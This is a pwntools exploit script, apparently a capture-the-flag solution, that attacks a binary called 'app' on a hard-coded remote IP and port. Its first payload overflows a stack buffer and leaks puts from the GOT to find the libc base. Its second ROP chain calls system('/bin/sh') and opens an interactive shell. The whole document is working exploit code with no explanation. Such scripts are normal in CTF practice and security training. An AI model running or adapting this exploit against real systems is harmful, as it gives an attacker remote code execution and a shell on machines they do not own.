#!/usr/bin/env python3

from pwn import *

exe = ELF("./app")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

gdb_script = """
b *main+171
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdb_script)
    else:
        r = remote("157.180.85.167", 20008)

    return r

offset = 120
puts_plt = exe.plt['puts']
puts_got = exe.got['puts']
main_addr = exe.symbols['main']
pop_rdi = 0x401226
ret = 0x0401016
def main():
    r = conn()

    # good luck pwning :)
    payload = flat(
        b'A' * (offset-6),
        b'Leak--',
        pop_rdi,
        puts_got,
        puts_plt,
        main_addr
    )
    r.sendline(payload)
    #========filter leak===============
    r.recvuntil(b'Leak--')
    r.recv(3)
    leak = u64(r.recvline().strip().ljust(8, b'\x00'))
    log.success(f"Leaked puts@GLIBC: {hex(leak)}")
    libc_off = 0x77980
    libc_base = leak - libc_off
    log.success(f"Libc base: {hex(libc_base)}")
    system = libc_base + libc.symbols['system']
    binsh = libc_base + 0x196031
    log.info(f"system addr = {hex(system)}")
    log.info(f"binsh => {hex(binsh)}")
    #=========== 
    payload2 = flat(
        b'A' * offset,
        ret,
        pop_rdi,
        binsh,
        system
    )
    r.sendlineafter(b'Name: ',payload2)
    r.interactive()
    

if __name__ == "__main__":
    main()
